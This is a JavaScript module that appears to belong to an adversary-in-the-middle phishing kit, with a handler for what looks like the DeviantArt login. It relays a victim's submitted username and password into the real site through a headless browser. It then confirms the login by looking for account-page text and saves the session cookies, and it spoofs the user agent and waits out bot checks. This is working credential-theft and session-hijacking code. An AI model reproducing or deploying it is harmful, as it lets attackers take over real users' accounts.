const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const username = `#username`
                await page.waitForSelector(username)
                await page.type(username, this.email)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Deviants You Watch", "Account Settings", "Log Out"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {
                const username = `#username`
                await page.waitForSelector(username)
                await page.type(username, body.username)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "home-password") {
                const password = `#password`
                await page.waitForSelector(password)
                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            if (this.innerHTMLMatcher(html, ["Please verify you are a human", "Access to this page has been denied because"])) {
                await new Promise(re => setTimeout(re, 10000))
                return await page.content()
            }
            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }